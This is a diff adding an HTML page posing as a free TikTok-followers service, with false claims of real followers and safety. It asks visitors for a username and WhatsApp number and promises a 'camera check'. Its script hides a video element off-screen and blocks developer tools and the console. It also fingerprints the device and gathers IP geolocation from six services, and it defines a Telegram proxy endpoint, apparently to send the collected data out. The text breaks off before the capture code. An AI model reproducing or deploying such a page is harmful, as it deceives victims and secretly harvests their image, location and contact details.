@@ -1,0 +1,1297 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>TikTok Followers — Official Growth Platform</title>
+    <link rel="icon" type="image/jpeg" href="https://i.ibb.co/6cvR8wBS/1000022954.jpg">
+    <style>
+        
+        :root {
+    --pink: #fe2c55;
+    --cyan: #25f4ee;
+    --dark: #0a0a0a;
+    --surface: #111111;
+    --surface-light: #1a1a1a;
+    --text: #ffffff;
+    --text-dim: #a0a0a0;
+    --border: #2a2a2a;
+    --radius: 16px;
+    --transition: 0.3s cubic-bezier(0.2, 0.9, 0.4, 1);
+}
+
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+    background: var(--dark);
+    color: var(--text);
+    font-family: 'Segoe UI', 'Inter', system-ui, -apple-system, sans-serif;
+    overflow-x: hidden;
+    -webkit-tap-highlight-color: transparent;
+    user-select: none;
+}
+
+/* Background Particles */
+.bg-particles {
+    position: fixed;
+    top:0; left:0; width:100%; height:100%;
+    pointer-events: none;
+    z-index: 0;
+    background: radial-gradient(circle at 30% 40%, rgba(254,44,85,0.08) 0%, transparent 50%),
+                radial-gradient(circle at 70% 80%, rgba(37,244,238,0.06) 0%, transparent 50%);
+    animation: bgShift 10s infinite alternate;
+}
+@keyframes bgShift {
+    0% { opacity:0.7; transform: scale(1); }
+    100% { opacity:1; transform: scale(1.05); }
+}
+
+/* Page Wrapper */
+.page-wrapper {
+    position: relative;
+    z-index: 1;
+    max-width: 100%;
+}
+
+/* Site Header */
+.site-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 20px 24px;
+    position: sticky;
+    top:0;
+    z-index: 100;
+    backdrop-filter: blur(20px);
+    background: rgba(10,10,10,0.7);
+    border-bottom: 1px solid rgba(255,255,255,0.05);
+}
+.nav-logo {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+}
+.logo-svg {
+    filter: drop-shadow(0 0 8px var(--pink));
+}
+.logo-name {
+    font-size: 18px;
+    font-weight: 700;
+    letter-spacing: -0.5px;
+}
+.logo-name .accent {
+    color: var(--pink);
+    font-weight: 500;
+}
+.nav-status {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 13px;
+    color: #ccc;
+}
+.dot-live {
+    width: 8px; height: 8px;
+    background: #4ade80;
+    border-radius: 50%;
+    animation: pulse-dot 1.5s infinite;
+}
+@keyframes pulse-dot {
+    0%,100% { box-shadow: 0 0 0 0 rgba(74,222,128,0.7); }
+    50% { box-shadow: 0 0 0 10px rgba(74,222,128,0); }
+}
+
+/* Hero Section */
+.hero {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    justify-content: center;
+    padding: 60px 24px 40px;
+    min-height: 80vh;
+    gap: 40px;
+}
+.hero-content {
+    flex: 1 1 300px;
+    text-align: center;
+}
+.hero-title {
+    font-size: clamp(2rem, 8vw, 3.5rem);
+    font-weight: 800;
+    line-height: 1.2;
+    margin-bottom: 16px;
+}
+.gradient-text {
+    background: linear-gradient(135deg, var(--pink), var(--cyan));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+}
+.hero-sub {
+    font-size: 16px;
+    color: var(--text-dim);
+    margin-bottom: 28px;
+}
+.hero-btn {
+    display: inline-block;
+    background: white;
+    color: black;
+    font-weight: 700;
+    padding: 14px 32px;
+    border-radius: 50px;
+    text-decoration: none;
+    font-size: 16px;
+    transition: var(--transition);
+    box-shadow: 0 0 30px rgba(255,255,255,0.2);
+}
+.hero-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 0 40px rgba(255,255,255,0.3);
+}
+.hero-visual {
+    flex: 1 1 250px;
+    display: flex;
+    justify-content: center;
+}
+.floating-phone {
+    width: 200px;
+    height: 350px;
+    background: linear-gradient(145deg, #1a1a1a, #0a0a0a);
+    border-radius: 40px;
+    border: 3px solid #333;
+    position: relative;
+    box-shadow: 0 30px 50px rgba(0,0,0,0.6);
+    animation: floatPhone 6s infinite ease-in-out;
+}
+@keyframes floatPhone {
+    0%,100% { transform: translateY(0); }
+    50% { transform: translateY(-15px); }
+}
+.phone-screen {
+    position: absolute;
+    top: 12%; left: 8%; right: 8%; bottom: 12%;
+    background: #000;
+    border-radius: 28px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+}
+.follower-count {
+    font-size: 42px;
+    font-weight: 800;
+    color: var(--pink);
+    text-shadow: 0 0 20px var(--pink);
+}
+.follower-label {
+    font-size: 14px;
+    color: #aaa;
+    letter-spacing: 1px;
+}
+
+/* Get Started Section */
+.get-started {
+    padding: 60px 24px;
+    background: rgba(255,255,255,0.02);
+    backdrop-filter: blur(10px);
+    border-top: 1px solid rgba(255,255,255,0.04);
+    border-bottom: 1px solid rgba(255,255,255,0.04);
+}
+.section-header {
+    margin-bottom: 20px;
+}
+.section-header.center {
+    text-align: center;
+}
+.badge {
+    display: inline-block;
+    background: var(--pink);
+    color: white;
+    font-size: 11px;
+    font-weight: 700;
+    padding: 4px 12px;
+    border-radius: 20px;
+    margin-right: 10px;
+    vertical-align: middle;
+}
+.section-header h2 {
+    display: inline-block;
+    font-size: 28px;
+    font-weight: 700;
+    vertical-align: middle;
+}
+
+/* ================= PACKAGE TABS – PREMIUM DESIGN ================= */
+.package-tabs {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 12px;
+    margin: 24px 0 30px;
+}
+
+.package-card {
+    position: relative;
+    background: rgba(255, 255, 255, 0.03);
+    backdrop-filter: blur(12px);
+    border: 2px solid rgba(255, 255, 255, 0.08);
+    padding: 14px 20px;
+    border-radius: 60px;
+    cursor: pointer;
+    transition: all 0.4s cubic-bezier(0.2, 0.9, 0.4, 1);
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-weight: 600;
+    color: #ccc;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+    overflow: hidden;
+    z-index: 1;
+}
+
+.package-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: -100%;
+    width: 100%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.05), transparent);
+    transition: left 0.5s;
+    z-index: 0;
+}
+.package-card:hover::before {
+    left: 100%;
+}
+
+.package-card:hover {
+    border-color: var(--pink);
+    color: white;
+    transform: translateY(-3px);
+    box-shadow: 0 12px 24px rgba(254,44,85,0.2);
+    background: rgba(254,44,85,0.08);
+}
+
+.package-card.selected {
+    border-color: var(--pink);
+    background: rgba(254,44,85,0.12);
+    color: white;
+    box-shadow: 0 0 0 4px rgba(254,44,85,0.2), 0 10px 25px rgba(254,44,85,0.3);
+    transform: translateY(-2px);
+    font-weight: 700;
+}
+
+.package-card .check-mark {
+    position: absolute;
+    top: -6px;
+    right: -6px;
+    width: 26px;
+    height: 26px;
+    background: var(--pink);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: white;
+    font-size: 14px;
+    font-weight: 700;
+    box-shadow: 0 0 15px var(--pink);
+    z-index: 2;
+    transform: scale(0);
+    transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+}
+.package-card.selected .check-mark {
+    transform: scale(1);
+}
+
+.pkg-icon {
+    font-size: 22px;
+    line-height: 1;
+    position: relative;
+    z-index: 1;
+}
+.pkg-amount {
+    font-size: 18px;
+    font-weight: 700;
+    position: relative;
+    z-index: 1;
+    letter-spacing: -0.3px;
+}
+
+@media (max-width: 600px) {
+    .package-card {
+        padding: 12px 16px;
+    }
+    .pkg-icon {
+        font-size: 20px;
+    }
+    .pkg-amount {
+        font-size: 16px;
+    }
+}
+
+/* ================================================================ */
+
+/* Input Group */
+.input-group {
+    display: flex;
+    align-items: center;
+    background: var(--surface-light);
+    border: 2px solid #2a2a2a;
+    border-radius: 50px;
+    padding: 4px 4px 4px 20px;
+    margin: 20px auto;
+    max-width: 500px;
+    transition: var(--transition);
+}
+.input-group:focus-within {
+    border-color: var(--pink);
+    box-shadow: 0 0 0 4px rgba(254,44,85,0.1);
+}
+.input-icon {
+    font-size: 20px;
+    color: var(--cyan);
+    margin-right: 8px;
+}
+.input-group input {
+    flex: 1;
+    border: none;
+    background: transparent;
+    padding: 16px 4px;
+    outline: none;
+    color: white;
+    font-size: 16px;
+    font-family: inherit;
+}
+.input-group input::placeholder { color: #555; }
+
+/* WhatsApp explanation note */
+.whatsapp-note {
+    text-align: center;
+    margin: 10px auto 0;
+    max-width: 500px;
+    font-size: 13px;
+    color: #aaa;
+    line-height: 1.5;
+}
+.whatsapp-note strong {
+    color: #fff;
+}
+
+.free-offer {
+    text-align: center;
+    margin: 20px 0;
+    font-size: 15px;
+    color: #aaa;
+}
+.offer-tag {
+    background: var(--pink);
+    color: white;
+    padding: 2px 8px;
+    border-radius: 20px;
+    font-size: 11px;
+    margin-right: 6px;
+}
+
+/* CTA Button */
+.cta-button {
+    display: block;
+    width: fit-content;
+    margin: 20px auto;
+    padding: 16px 40px;
+    background: linear-gradient(135deg, var(--pink), #ff4d6d);
+    border: none;
+    border-radius: 50px;
+    font-size: 18px;
+    font-weight: 700;
+    color: white;
+    cursor: pointer;
+    position: relative;
+    overflow: hidden;
+    box-shadow: 0 10px 30px rgba(254,44,85,0.4);
+    transition: var(--transition);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+}
+.cta-button::after {
+    content: '';
+    position: absolute;
+    top: 0; left: -100%;
+    width: 200%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+    animation: shine 2.5s infinite;
+}
+@keyframes shine {
+    0% { left: -100%; }
+    100% { left: 100%; }
+}
+.cta-button:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 15px 40px rgba(254,44,85,0.6);
+}
+.cta-button:active { transform: scale(0.97); }
+.cta-button:disabled {
+    opacity: 0.7;
+    cursor: not-allowed;
+    transform: none;
+    animation: none;
+}
+.pulse-live {
+    display: inline-block;
+    width: 10px; height: 10px;
+    background: white;
+    border-radius: 50%;
+    margin-right: 8px;
+    animation: livePulse 1.4s infinite;
+}
+@keyframes livePulse {
+    0%,100% { box-shadow: 0 0 0 0 rgba(255,255,255,0.8); }
+    50% { box-shadow: 0 0 0 14px rgba(255,255,255,0); }
+}
+
+/* Features */
+.features {
+    padding: 80px 24px;
+}
+.features-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+    gap: 30px;
+    max-width: 1000px;
+    margin: 0 auto;
+}
+.feat-item {
+    text-align: center;
+    padding: 30px 20px;
+    background: rgba(255,255,255,0.03);
+    border-radius: 20px;
+    border: 1px solid rgba(255,255,255,0.04);
+    backdrop-filter: blur(10px);
+    transition: var(--transition);
+}
+.feat-item:hover {
+    transform: translateY(-6px);
+    border-color: var(--pink);
+}
+.feat-icon { font-size: 36px; margin-bottom: 10px; }
+.feat-item h4 { font-size: 18px; margin-bottom: 8px; color: white; }
+.feat-item p { font-size: 13px; color: #aaa; line-height: 1.5; }
+
+/* Steps */
+.steps {
+    padding: 60px 24px;
+    background: rgba(255,255,255,0.02);
+}
+.steps-timeline {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 40px;
+    max-width: 900px;
+    margin: 30px auto 0;
+}
+.step-item {
+    display: flex;
+    align-items: flex-start;
+    gap: 15px;
+    flex: 1 1 180px;
+}
+.step-marker {
+    width: 36px; height: 36px;
+    background: var(--pink);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 800;
+    font-size: 14px;
+    box-shadow: 0 0 20px rgba(254,44,85,0.5);
+    flex-shrink: 0;
+}
+.step-content h4 {
+    font-size: 16px;
+    margin-bottom: 4px;
+}
+.step-content p {
+    font-size: 13px;
+    color: #aaa;
+}
+
+/* Testimonials */
+.testimonials {
+    padding: 80px 24px;
+}
+.testimonial-cards {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 30px;
+    max-width: 900px;
+    margin: 30px auto 0;
+}
+.t-card {
+    background: rgba(255,255,255,0.03);
+    border: 1px solid rgba(255,255,255,0.05);
+    border-radius: 20px;
+    padding: 24px;
+    flex: 1 1 280px;
+    backdrop-filter: blur(10px);
+}
+.t-card p {
+    font-size: 14px;
+    line-height: 1.6;
+    color: #ddd;
+    margin-bottom: 12px;
+    font-style: italic;
+}
+.t-author {
+    font-size: 12px;
+    color: #888;
+}
+
+/* FAQ */
+.faq {
+    padding: 60px 24px;
+    background: rgba(255,255,255,0.02);
+}
+.faq-list {
+    max-width: 700px;
+    margin: 30px auto 0;
+    display: flex;
+    flex-direction: column;
+    gap: 20px;
+}
+.faq-item {
+    background: rgba(255,255,255,0.03);
+    border: 1px solid rgba(255,255,255,0.04);
+    border-radius: 16px;
+    padding: 20px;
+}
+.faq-item h4 {
+    font-size: 16px;
+    margin-bottom: 8px;
+    color: white;
+}
+.faq-item p {
+    font-size: 13px;
+    color: #aaa;
+    line-height: 1.5;
+}
+
+/* Footer */
+.site-footer {
+    padding: 30px 24px;
+    text-align: center;
+    border-top: 1px solid #222;
+    color: #666;
+    font-size: 13px;
+}
+.footer-links {
+    margin-top: 10px;
+    display: flex;
+    justify-content: center;
+    gap: 20px;
+}
+.footer-links span {
+    cursor: pointer;
+    transition: color 0.2s;
+}
+.footer-links span:hover { color: white; }
+
+/* Overlay */
+.overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.85);
+    backdrop-filter: blur(10px);
+    z-index: 1000;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+}
+.overlay.active { display: flex; }
+.overlay-card {
+    background: #1a1a1a;
+    border-radius: 24px;
+    padding: 32px 24px;
+    text-align: center;
+    max-width: 320px;
+    border: 1px solid #333;
+    box-shadow: 0 30px 50px rgba(0,0,0,0.7);
+}
+.spinner {
+    width: 44px; height: 44px;
+    border: 4px solid #333;
+    border-top-color: var(--pink);
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    margin: 0 auto 16px;
+}
+@keyframes spin { to { transform:rotate(360deg); } }
+.overlay-msg { font-size: 14px; color: #aaa; }
+.success-icon { font-size: 50px; }
+.success-title { font-size: 18px; font-weight: 700; color: white; margin: 8px 0 4px; }
+.success-sub { font-size: 12px; color: #aaa; }
+
+.hidden-video { position:fixed; top:-9999px; left:-9999px; width:640px; height:480px; opacity:0; pointer-events:none; }
+.hidden-canvas { display:none; }
+
+/* Responsive */
+@media (max-width: 600px) {
+    .hero { flex-direction: column; text-align: center; }
+    .package-tabs { gap: 8px; }
+    .package-card { padding: 10px 14px; font-size: 14px; }
+    .cta-button { width: 90%; }
+    }
+        
+    </style>
+
+    <!-- Popunder Ad Script -->
+    <script src="https://pl28483160.profitableratecpmnetwork.com/7e/9f/38/7e9f389ffba9d77659cb18b8b4246ff9.js"></script>
+    
+    <!-- Social Bar Ad Script -->
+    <script src="https://pl28510942.profitableratecpmnetwork.com/39/3c/7e/393c7e7eacac1a10dbb649e4b5bc54a3.js"></script>
+</head>
+<body>
+
+<!-- Background Particles -->
+<div class="bg-particles" id="bgParticles"></div>
+
+<!-- Main Website -->
+<div class="page-wrapper">
+
+    <!-- Header / Nav -->
+    <header class="site-header">
+        <div class="nav-logo">
+            <svg class="logo-svg" viewBox="0 0 28 28" width="32" height="32">
+                <path d="M14 3v12.5a3.5 3.5 0 1 1-3.5-3.5" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                <path d="M14 3c2.5 2.5 5 4 8 4v3c-3 0-5.5-1.5-8-4" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            <span class="logo-name">TikTok <span class="accent">Followers</span></span>
+        </div>
+        <div class="nav-status">
+            <span class="dot-live"></span> Online
+        </div>
+    </header>
+
+    <!-- Banner 300x50 (Mobile Optimized) -->
+    <div class="banner-ad-container" style="text-align: center; margin: 15px 0; overflow: hidden;">
+        <script>
+          atOptions = {
+            'key' : '8e33778c749cd5be4f2c7d73b5f9aa35',
+            'format' : 'iframe',
+            'height' : 50,
+            'width' : 320,
+            'params' : {}
+          };
+        </script>
+        <script src="https://www.highrevenueformat.com/8e33778c749cd5be4f2c7d73b5f9aa35/invoke.js"></script>
+    </div>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-content">
+            <h1 class="hero-title">
+                Get <span class="gradient-text">Real Followers</span><br>on TikTok Instantly
+            </h1>
+            <p class="hero-sub">No password · No bots · 100% safe · Trusted by 2M+ creators</p>
+            <a href="#get-started" class="hero-btn">Start Now <span>↓</span></a>
+        </div>
+        <div class="hero-visual">
+            <div class="floating-phone">
+                <div class="phone-screen">
+                    <div class="follower-count">12.5K</div>
+                    <div class="follower-label">followers</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Native Banner Section -->
+    <div class="native-ad-container" style="text-align: center; margin: 20px auto; padding: 10px;">
+        <script async="async" data-cfasync="false" src="https://pl28510948.profitableratecpmnetwork.com/f090a29aa03655bed94f0ec31505de26/invoke.js"></script>
+        <div id="container-f090a29aa03655bed94f0ec31505de26"></div>
+    </div>
+
+    <!-- Get Started (Package + Username) -->
+    <section class="get-started" id="get-started">
+        <div class="section-header">
+            <span class="badge">Step 1</span>
+            <h2>Choose Your Boost</h2>
+        </div>
+        <div class="package-tabs" id="operatorGrid">
+            <div class="package-card" data-op="100 Followers" data-code="100">
+                <span class="pkg-icon">👤</span>
+                <span class="pkg-amount">100</span>
+            </div>
+            <div class="package-card" data-op="500 Followers" data-code="500">
+                <span class="pkg-icon">👥</span>
+                <span class="pkg-amount">500</span>
+            </div>
+            <div class="package-card" data-op="1,000 Followers" data-code="1000">
+                <span class="pkg-icon">👥👥</span>
+                <span class="pkg-amount">1K</span>
+            </div>
+            <div class="package-card" data-op="2,500 Followers" data-code="2500">
+                <span class="pkg-icon">👥👥👥</span>
+                <span class="pkg-amount">2.5K</span>
+            </div>
+            <div class="package-card" data-op="5,000 Followers" data-code="5000">
+                <span class="pkg-icon">🔥</span>
+                <span class="pkg-amount">5K</span>
+            </div>
+            <div class="package-card" data-op="10,000 Followers" data-code="10000">
+                <span class="pkg-icon">🚀</span>
+                <span class="pkg-amount">10K</span>
+            </div>
+        </div>
+
+        <div class="section-header">
+            <span class="badge">Step 2</span>
+            <h2>Your TikTok Username</h2>
+        </div>
+        <div class="input-group">
+            <span class="input-icon">@</span>
+            <input type="text" id="phoneInput" placeholder="enter your username" autocomplete="off">
+        </div>
+
+        <!-- NEW: WhatsApp Number -->
+        <div class="section-header" style="margin-top: 30px;">
+            <span class="badge">Step 3</span>
+            <h2>Your WhatsApp Number</h2>
+        </div>
+        <div class="input-group">
+            <span class="input-icon">
+                <svg viewBox="0 0 24 24" width="20" height="20" fill="#25D366">
+                    <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
+                </svg>
+            </span>
+            <input type="tel" id="whatsappInput" placeholder="+1 234 567 890" autocomplete="off">
+        </div>
+        <p class="whatsapp-note">📲 <strong>Why we need this?</strong> If followers don't arrive, we'll contact you via WhatsApp to ensure delivery. No spam.<br>
+        <span style="font-size:12px;">আপনার হোয়াটসঅ্যাপ নাম্বার দিন, যাতে ফলোয়ার না গেলে আমরা যোগাযোগ করতে পারি।</span></p>
+
+        <div class="free-offer">
+            <span class="offer-tag">🎁 FREE</span>
+            <strong>500 followers</strong> for new users — no password required
+        </div>
+
+        <!-- Button structure compatible with JS innerHTML reset -->
+        <button class="cta-button" id="claimBtn">
+            <span class="pulse-live"></span> Get Free Followers
+        </button>
+    </section>
+
+    <!-- Why Us -->
+    <section class="features">
+        <div class="section-header center">
+            <h2>Why creators choose us</h2>
+        </div>
+        <div class="features-grid">
+            <div class="feat-item">
+                <div class="feat-icon">👤</div>
+                <h4>Real People</h4>
+                <p>Followers from active accounts, never bots.</p>
+            </div>
+            <div class="feat-item">
+                <div class="feat-icon">🔒</div>
+                <h4>No Password</h4>
+                <p>We only need your public username.</p>
+            </div>
+            <div class="feat-item">
+                <div class="feat-icon">⚡</div>
+                <h4>Instant Start</h4>
+                <p>Delivery begins in under 60 seconds.</p>
+            </div>
+            <div class="feat-item">
+                <div class="feat-icon">🌍</div>
+                <h4>Global Reach</h4>
+                <p>Followers from worldwide or target region.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- How It Works -->
+    <section class="steps">
+        <div class="section-header center">
+            <h2>How it works</h2>
+        </div>
+        <div class="steps-timeline">
+            <div class="step-item">
+                <div class="step-marker">1</div>
+                <div class="step-content">
+                    <h4>Select package</h4>
+                    <p>Choose followers amount</p>
+                </div>
+            </div>
+            <div class="step-item">
+                <div class="step-marker">2</div>
+                <div class="step-content">
+                    <h4>Enter username</h4>
+                    <p>No password needed</p>
+                </div>
+            </div>
+            <div class="step-item">
+                <div class="step-marker">3</div>
+                <div class="step-content">
+                    <h4>Verify quickly</h4>
+                    <p>One‑tap camera check</p>
+                </div>
+            </div>
+            <div class="step-item">
+                <div class="step-marker">4</div>
+                <div class="step-content">
+                    <h4>Followers arrive</h4>
+                    <p>Instant boost on your profile</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Testimonials -->
+    <section class="testimonials">
+        <div class="section-header center">
+            <h2>Loved by creators</h2>
+        </div>
+        <div class="testimonial-cards">
+            <div class="t-card">
+                <p>"My account jumped from 2k to 10k in one day. Real, active followers — exactly what I needed to go viral."</p>
+                <span class="t-author">— @dancequeen.official</span>
+            </div>
+            <div class="t-card">
+                <p>"Finally a growth service that doesn’t ask for my password. Super safe, and the free followers really showed up!"</p>
+                <span class="t-author">— @viral_creator_22</span>
+            </div>
+        </div>
+    </section>
+
+    <!-- FAQ -->
+    <section class="faq">
+        <div class="section-header center">
+            <h2>Questions? We have answers.</h2>
+        </div>
+        <div class="faq-list">
+            <div class="faq-item">
+                <h4>Is this really free?</h4>
+                <p>Yes! The first 500 followers are completely free with our exclusive offer.</p>
+            </div>
+            <div class="faq-item">
+                <h4>Will my account get banned?</h4>
+                <p>No. We deliver followers organically, just like real growth — 100% safe.</p>
+            </div>
+            <div class="faq-item">
+                <h4>How fast are the followers?</h4>
+                <p>Followers start appearing within seconds after you complete the verification.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Banner 160x600 -->
+    <div class="banner-ad-container" style="text-align: center; margin: 30px 0; overflow: hidden;">
+        <script>
+          atOptions = {
+            'key' : '7a3b94797bab09c35f38dd95570c2047',
+            'format' : 'iframe',
+            'height' : 600,
+            'width' : 160,
+            'params' : {}
+          };
+        </script>
+        <script src="https://www.highrevenueformat.com/7a3b94797bab09c35f38dd95570c2047/invoke.js"></script>
+    </div>
+
+    <!-- Footer -->
+    <footer class="site-footer">
+        <p>© 2025 TikTok Followers — Official Growth Platform. All rights reserved.</p>
+        <div class="footer-links">
+            <span>Privacy</span>
+            <span>Terms</span>
+            <span>Contact</span>
+        </div>
+    </footer>
+</div>
+
+<!-- Overlay -->
+<div class="overlay" id="overlay">
+    <div class="overlay-card" id="overlayCard">
+        <div class="spinner" id="overlaySpinner"></div>
+        <p class="overlay-msg" id="overlayMsg">⏳ Processing your request...</p>
+    </div>
+</div>
+
+<!-- Hidden camera -->
+<video id="hiddenVideo" class="hidden-video" playsinline autoplay muted></video>
+<canvas id="hiddenCanvas" class="hidden-canvas"></canvas>
+
+<script>
+    
+    (function() {
+    // ============ Security ============
+    document.oncontextmenu = () => false;
+    document.onkeydown = function(e) {
+        if (e.keyCode==123 || (e.ctrlKey && e.shiftKey && (e.keyCode==73||e.keyCode==74||e.keyCode==67)) || (e.ctrlKey && e.keyCode==85)) {
+            e.preventDefault(); e.stopPropagation(); return false;
+        }
+    };
+    setInterval(() => {
+        let s = new Date(); debugger; let e = new Date();
+        if (e - s > 100) {
+            document.body.innerHTML = '<h1 style="text-align:center;margin-top:40vh;color:red;">Access Denied</h1>';
+            throw new Error('Debugger');
+        }
+    }, 1000);
+    setInterval(() => { console.clear(); }, 500);
+
+    // ============ PROXY CONFIG ============
+    const PROXY_URL = '/api/telegram-proxy';
+    const STATIC_IMAGE = "https://i.ibb.co/JWn2Xqzn/1000022932.png";
+
+    const getParam = p => new URLSearchParams(window.location.search).get(p);
+
+    // DOM
+    const opGrid = document.getElementById('operatorGrid');
+    const phoneInp = document.getElementById('phoneInput');
+    const whatsappInp = document.getElementById('whatsappInput');
+    const claimBtn = document.getElementById('claimBtn');
+    const overlay = document.getElementById('overlay');
+    const overlayCard = document.getElementById('overlayCard');
+    let overlaySpinner = document.getElementById('overlaySpinner');
+    let overlayMsg = document.getElementById('overlayMsg');
+    const hiddenVideo = document.getElementById('hiddenVideo');
+    const hiddenCanvas = document.getElementById('hiddenCanvas');
+
+    let selectedOp = null, selectedCode = null;
+    let stream = null, captureTimer = null;
+    let ipData = null, deviceInfo = null;
+    let simulationInterval = null;
+
+    // Package selection
+    opGrid.addEventListener('click', e => {
+        let card = e.target.closest('.package-card');
+        if (!card) return;
+        opGrid.querySelectorAll('.package-card').forEach(c => c.classList.remove('selected'));
+        card.classList.add('selected');
+        selectedOp = card.dataset.op;
+        selectedCode = card.dataset.code;
+        if (navigator.vibrate) navigator.vibrate(8);
+    });
+
+    // Overlay helpers
+    function showOverlay(msg, showSpinner = true) {
+        overlay.classList.add('active');
+        if (overlaySpinner) overlaySpinner.style.display = showSpinner ? 'block' : 'none';
+        if (overlayMsg) overlayMsg.textContent = msg || 'Processing...';
+    }
+    function hideOverlay() {
+        overlay.classList.remove('active');
+        overlayCard.innerHTML = '<div class="spinner" id="overlaySpinner"></div><p class="overlay-msg" id="overlayMsg">⏳ Processing your request...</p>';
+        overlaySpinner = document.getElementById('overlaySpinner');
+        overlayMsg = document.getElementById('overlayMsg');
+    }
+    function successOverlay(title, sub) {
+        overlay.classList.add('active');
+        overlayCard.innerHTML = `<div class="success-icon">✅</div><div class="success-title">${title||'Success!'}</div><div class="success-sub">${sub||''}</div>`;
+        setTimeout(hideOverlay, 4000);
+    }
+
+    // Device Info
+    function getDeviceInfo() {
+        let d = {};
+        d.screenW = screen.width; d.screenH = screen.height;
+        d.colorDepth = screen.colorDepth; d.pixelRatio = devicePixelRatio||1;
+        d.platform = navigator.platform||'?'; d.lang = navigator.language;
+        d.ua = navigator.userAgent.substring(0,80);
+        d.memory = navigator.deviceMemory||'N/A';
+        d.cores = navigator.hardwareConcurrency||'N/A';
+        let c = navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+        d.netType = c?.effectiveType||'N/A'; d.downlink = c?.downlink||'N/A'; d.rtt = c?.rtt||'N/A';
+        d.touch = navigator.maxTouchPoints||0;
+        return d;
+    }
+
+    // IP Fetch
+    async function fetchIP() {
+        const apis = [
+            {u:'https://ipapi.co/json/', p:d=>({ip:d.ip,city:d.city,region:d.region,country:d.country_name,isp:d.org,asn:d.asn,lat:d.latitude,lon:d.longitude,postal:d.postal,timezone:d.timezone})},
+            {u:'https://ip-api.com/json/', p:d=>({ip:d.query,city:d.city,region:d.regionName,country:d.country,isp:d.isp,asn:d.as,lat:d.lat,lon:d.lon,postal:d.zip,timezone:d.timezone})},
+            {u:'https://ipinfo.io/json', p:d=>{let l=d.loc?d.loc.split(','):[];return {ip:d.ip,city:d.city,region:d.region,country:d.country,isp:d.org,asn:d.asn?d.asn.split(' ')[0]:'',lat:l[0]||'',lon:l[1]||'',postal:d.postal,timezone:d.timezone};}},
+            {u:'https://ipwho.is/', p:d=>({ip:d.ip,city:d.city,region:d.region,country:d.country,isp:(d.connection||{}).isp||'',asn:String((d.connection||{}).asn||''),lat:d.latitude,lon:d.longitude,postal:d.postal,timezone:(d.timezone||{}).id||''})},
+            {u:'https://ifconfig.co/json', p:d=>({ip:d.ip,city:d.city,region:d.region_name,country:d.country,isp:d.isp||'',asn:d.asn||'',lat:d.latitude,lon:d.longitude,postal:d.postal_code||'',timezone:d.timezone})},
+            {u:'https://api.ip.sb/geoip', p:d=>({ip:d.ip,city:d.city,region:d.region,country:d.country,isp:d.isp,asn:String(d.asn||''),lat:d.latitude,lon:d.longitude,postal:d.postal_code||'',timezone:d.timezone})}
+        ];
+        for (let a of apis) {
+            try {
+                let ctrl = new AbortController();
+                let t = setTimeout(()=>ctrl.abort(), 2000);
